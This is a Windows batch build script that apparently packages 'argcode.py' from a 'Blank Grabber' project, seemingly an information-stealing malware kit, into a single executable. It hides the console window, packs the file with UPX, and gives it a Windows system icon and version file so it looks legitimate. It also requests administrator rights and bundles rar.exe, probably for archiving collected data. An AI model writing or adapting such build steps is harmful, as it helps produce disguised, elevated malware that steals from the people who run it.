@echo off
pip install -r "D:\v\Blank-Grabberr\Blank Grabber\Components\requirements.txt"
pyinstaller --noconfirm --onefile --windowed --icon "D:/v/Blank-Grabberr/build/imageres_15.ico" --upx-dir "D:/v/Blank-Grabberr/UPX" --version-file "D:/v/Blank-Grabberr/Blank Grabber/Components/version.txt" --uac-admin --add-data "D:/v/Blank-Grabberr/Blank Grabber/Components/rar.exe;." --add-data "D:/v/Blank-Grabberr/Blank Grabber/Components/rarreg.key;."  "D:/v/Blank-Grabberr/argcode.py"
rmdir /S /Q D:\v\Blank-Grabberr\build\argcode-o
